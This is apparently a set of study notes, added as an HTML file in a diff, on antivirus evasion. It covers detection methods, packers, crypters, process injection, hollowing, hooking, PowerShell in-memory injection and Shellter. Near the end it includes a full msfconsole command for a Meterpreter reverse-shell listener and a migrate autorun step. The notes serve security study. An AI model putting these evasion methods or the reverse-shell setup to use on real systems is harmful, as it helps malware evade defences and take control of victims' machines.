@@ -1,0 +1,39 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Antivirus evasion</title>
+</head><body>virustotal.com allows us to run a virus scan on any executable and shows the detection rate of various anti virus products<br/>
+Anti virus detection methods:<ul><li style="list-style-type: none">Signature-based detection: this is a black list technology. We can bypass signature-based detection by obfuscating the content of a file </li>
+<li style="list-style-type: none">Huristic-based detection: it relies on rules and algorithms based on the analisys of the instruction set of a binary file or its decompilation and analisys of derived source code</li>
+<li style="list-style-type: none">Behavioural-based detection: based on the dynamic analisys of the binary file behaviour, often executed on a sandbox environment</li>
+</ul>
+Most antivirus products offer a combination of these three capabilities to achieve beffere detection rate<br/>
+Antivirus evasion:<ul><li style="list-style-type: none">On disk evasion: it focuses on modifying malicious files physically stored on disk in order to avoid detection. There are 4 &nbsp;main techniques to obfuscate files stored on a physical disk: </li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">Packers: it generates a functionally equivalent binary with a completely new binary structure, thus with a new signature to bypass AV scanners</li>
+<li style="list-style-type: none">Ofuscators: they reorganize and mutate code in a way that it makes more difficult to reverse engineer it. This includes replacing instructions with semantically equivalent ones, inserting irrelevant instructions (dead code), re-order functions and so on</li>
+<li style="list-style-type: none">Crypters (crypter software): they crytographycally alter eecutable code, adding a decrypting stub that restores the original code upon execution. This decryption happens in memory, leaving on disk only encrypted code and thus evading AV detection</li>
+<li style="list-style-type: none">Software protectors: originally used for legitimate purposes, can also be used to bypass AV detection</li>
+</ul>
+</li>
+<li style="list-style-type: none">In memory evasion: modern malware often attempts in memory operations, to avoid touching the disk entirely. This technique (in memory injection or PE injection) focuses on the manipulation of volatile memory and does not write any file to disk, which is one of the area of most focus for many antivirus products</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">Remote Process Memory Injection: it attempts to inject the payload in the memory of another valid program that is not malicious, The most common way to do this is to leverage a set of Windows APIs to execute the malicious code in a separate thread using the CreateRemoteThread API</li>
+<li style="list-style-type: none">Reflective DLL Injection: it attempts to load a DLL stored by the attacker in the process memory. Unlike regular DLL injection (loading a DLL from disk with the LoadLibrary API), loading a DLL from process memory is not supported by any Windows API and the attackers must write their own API to do that </li>
+<li style="list-style-type: none">Process Hollowing: attackers first launch a non malicious process in a suspended state. Once launched, the image of this process is removed from memory and replaced with a malicious executable image. Then execution is resumed and malicious code is executed instead of the legitimate process</li>
+<li style="list-style-type: none">Inline hooking: it involves modifying memory and introducing a hook (an instruction that redirects code execution into a function to point the execution flow to our malicious code). Upon executing of the malicious code, the flow will return back to the modified function and resume execution, appearing like only the legitimate code has been executed</li>
+</ul>
+</li>
+</ul>
+Generally speaking, it is very difficult to find an universal solution to bypass AV detection. What is instead doable, is to target a specific AV product/version and focus on avoiding detection for a very specific situation/configuration<br/>
+PowerShell in-memory Injection:<ul><li style="list-style-type: none">A very powerful feature of PowerShell is its ability to interact with Windows APIs. This allows us to implement the in-memory injection process in a PowerShell script. It is much more difficult for AV software to flag a script as malicious, rather then a PE (portable executable), since the script is not compiled, but interpreted and can be changed on the fly at any point in time</li>
+</ul>
+Shellter:<ul><li style="list-style-type: none">Shellter is a dynamic shellcode injection tool to inject shellcode into legitimate PEs memory space to avoid AV detection. Shellter attempts to use the existing PE"s importAddress table entries to locate functions that will be used fo the memory allocation, transfer and execution of our payload</li>
+<li style="list-style-type: none">In case we have selected a Meterpreter_Reverse_TCP payload to be injected in a PE with Shellter and configured a listener on the attacker machine (i.e.: msfconsole -x "use exploit/multi/handler; set RHOST 10.11.0.22; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.11.0.4; exploit"), it is crucial to setup an autorun script to migrate our Meterpreter shell to a separate process immediately after session creation in case the injected PE execution completes quickly. We can setup the autorun script as follows from within msfconsole: set AutoRunScript post/windows/manage/migrate</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+</ul>
+</body></html>
